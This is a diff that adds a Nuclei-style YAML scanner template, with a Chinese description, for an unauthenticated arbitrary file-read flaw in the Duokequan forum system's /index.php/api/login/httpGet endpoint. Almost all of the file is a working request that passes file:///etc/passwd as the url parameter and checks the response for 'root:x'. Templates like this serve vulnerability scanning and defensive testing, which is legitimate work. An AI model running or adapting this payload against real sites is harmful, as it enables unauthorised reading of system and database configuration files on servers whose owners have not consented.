@@ -1,0 +1,23 @@
+id: duokequan-httpGet-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 多客圈子论坛系统 /index.php/api/login/httpGet 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9FhttpGet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: word
+        part: body
+        words:
+          - root:x
